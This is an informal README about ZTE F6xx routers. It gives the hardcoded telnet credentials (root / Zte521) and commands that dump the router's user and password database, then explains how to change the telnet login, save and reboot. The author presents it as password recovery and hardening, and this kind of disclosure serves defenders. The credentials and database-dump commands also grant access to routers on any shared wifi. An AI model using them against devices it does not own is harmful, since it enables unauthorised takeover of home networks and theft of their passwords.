#  [![creatorb](https://cdn2.iconfinder.com/data/icons/software-development-glyph-black/2048/5396_-_Bug_in_Application-64.png )](https://postimg.org/image/u69xjk8nn/) ZTE F6** bug

I dont want to talk to much, it isn't how to hack wifi, all about what i am explained here it just little bug on zte f6** router devices... no crack, no break, no hack but by telnet we rock.

Required:
  - telnet
  - wifi connected

i think it can be another way to get back your lost password on gui panel of your router device.

> This bug's started

> with zte f6xx default password

> username : root

> password : Zte521

> you can bypass it on telnet

> don't panic isn't someone cant access it

> if s/he isn't connected with your wifi right ?

> but can u make sure if one day no one else can access it

> your wifi, your wifi, your wifi ... our wifi


### POC
Open terminal using telnet to connect your gateway (assume: 192.168.1.1).

```sh
/ # telnet 192.168.1.1
/ # username : root
/ # password : Zte521
```

then if you already loged, try to read database user...

```sh
/ # sendcmd 1 DB p DevAuthInfo
```

thats for f609 sometimes have different table name in another devices you can see all db by:

```sh
/ # sendcmd 1 DB p
```

### Patching

Well its all will going ok
since you had known all table and value.

Change username:
```sh
/ # sendcmd 1 DB set TelnetCfg 0 TS_UName NewUserName
```

Change Password:
```sh
/ # sendcmd 1 DB set TelnetCfg 0 TS_UPwd NewPassword
```

Save:
```sh
/ # sendcmd 1 DB save
```
Reboot:
```sh
/ # reboot
```

Well its all how it going, enjoy and stay beware everywhere, btw what news here's my isp have been upgraded some device with no telnet, nice no telnet no Rock-et!


### Todos

 - Bash Checker

License
----

MIT


**Free Software, Rock Yeah!**

~ creatorbe
